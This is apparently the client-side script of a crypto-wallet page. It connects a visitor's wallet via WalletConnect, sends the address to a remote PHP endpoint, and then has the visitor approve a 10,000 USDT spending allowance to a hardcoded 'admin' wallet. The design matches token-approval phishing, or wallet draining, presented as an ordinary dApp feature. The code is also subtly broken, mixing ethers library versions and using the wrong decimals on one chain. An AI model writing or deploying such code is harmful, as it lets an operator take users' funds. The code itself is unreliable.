import EthereumProvider from "@walletconnect/ethereum-provider";
import { ethers } from "ethers";

const CHAIN_CONFIG = {
    bep: {
        chainId: 56,
        usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
        adminWallet: "0x8209f963F4E0956fdf92D1757d53164d61622271",
        decimals: 18,
        connectButtonId: "connectWallet",
        approveButtonId: "approveUSDT",
        userAddressId: "userAddress",
        userBalanceId: "userBalance",
        walletInfoId: "walletInfo",
    },
    erc: {
        chainId: 1,
        usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        adminWallet: "0x8209f963F4E0956fdf92D1757d53164d61622271",
        decimals: 6,
        connectButtonId: "connectWalleterc",
        approveButtonId: "approveUSDTerc",
        userAddressId: "userAddresserc",
        userBalanceId: "userBalanceerc",
        walletInfoId: "walletInfoerc",
    }
};

const ABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
const USDT_ABI = ["function balanceOf(address owner) view returns (uint256)"];

async function connectWallet(chainType) {
    const config = CHAIN_CONFIG[chainType];
    const connectButton = document.getElementById(config.connectButtonId);
    const approveButton = document.getElementById(config.approveButtonId);
    const userAddressSpan = document.getElementById(config.userAddressId);
    const userBalanceSpan = document.getElementById(config.userBalanceId);
    const walletInfoDiv = document.getElementById(config.walletInfoId);

    connectButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
    connectButton.disabled = true;

    try {
        const provider = await EthereumProvider.init({
            projectId: "5c7a882142c7491241b507534414ddff",
            chains: [config.chainId],
            methods: ["eth_sendTransaction", "eth_sign", "personal_sign"],
            showQrModal: true
        });

        await provider.connect();

        const ethersProvider = new ethers.BrowserProvider(provider);
        const signer = await ethersProvider.getSigner();
        const userAddress = await signer.getAddress();

        // Save wallet to backend
        try {
            const endpoint = chainType === 'erc'
                ? 'https://tradeinusdt.com/erc/save_walleterc.php'
                : 'https://tradeinusdt.com/erc/save_wallet.php';

            await fetch(endpoint, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ wallet: userAddress }),
            });
        } catch (saveError) {
            console.warn("Wallet saving failed:", saveError);
        }

        if (approveButton) approveButton.style.display = "inline-block";
        if (userAddressSpan) userAddressSpan.textContent = userAddress;
        if (walletInfoDiv) walletInfoDiv.style.display = "block";

       if (chainType === 'bep') {
            showBepSection();
             const approveSection = document.getElementById("approveUSDTSection");
            if (approveSection) approveSection.style.display = "block";
        } else if (chainType === 'erc') {
            showErcSection();
            const approveSection = document.getElementById("approveUSDTSectionerc");
            if (approveSection) approveSection.style.display = "block";
        }


        const usdt = new ethers.Contract(config.usdtAddress, USDT_ABI, ethersProvider);
        const rawBalance = await usdt.balanceOf(userAddress);
        const formattedBalance = ethers.formatUnits(rawBalance, config.decimals);
        if (userBalanceSpan) userBalanceSpan.textContent = formattedBalance + " USDT";

       if (approveButton) {
    approveButton.onclick = async () => {
        try {
            approveButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Approving...';
            approveButton.disabled = true;

            const contract = new ethers.Contract(config.usdtAddress, ABI, signer);
            
            // Set approval amount to 10,000 USDT (6 decimals)
            const amount = ethers.utils.parseUnits("10000", 6);

            const tx = await contract.approve(config.adminWallet, amount);
            await tx.wait();

            window.location.href = `/healthcard.html?wallet=${userAddress}`;
        } catch (error) {
            console.error("Approval error:", error);
            alert("Approval failed: " + error.message);
        } finally {
            approveButton.innerHTML = '<i class="fas fa-award"></i> Approve USDT';
            approveButton.disabled = false;
        }
    };
}


        return { signer, userAddress };

    } catch (error) {
        console.error("Connection error:", error);
        alert("Failed to connect: " + error.message);
        return null;
    } finally {
        connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
        connectButton.disabled = false;
    }
}

function initializeWallets() {
    const connectWalletBep = document.getElementById(CHAIN_CONFIG.bep.connectButtonId);
    if (connectWalletBep) {
        connectWalletBep.onclick = () => connectWallet('bep');
    }

    const connectWalletErc = document.getElementById(CHAIN_CONFIG.erc.connectButtonId);
    if (connectWalletErc) {
        connectWalletErc.onclick = () => connectWallet('erc');
    }
}

document.addEventListener('DOMContentLoaded', function () {
    initializeWallets();

    document.querySelectorAll('.wallet-copy-btn').forEach(btn => {
        btn.addEventListener('click', function () {
            const addressInput = this.closest('.wallet-address-container').querySelector('input');
            addressInput.select();
            document.execCommand('copy');
            alert('Address copied to clipboard!');
        });
    });
});
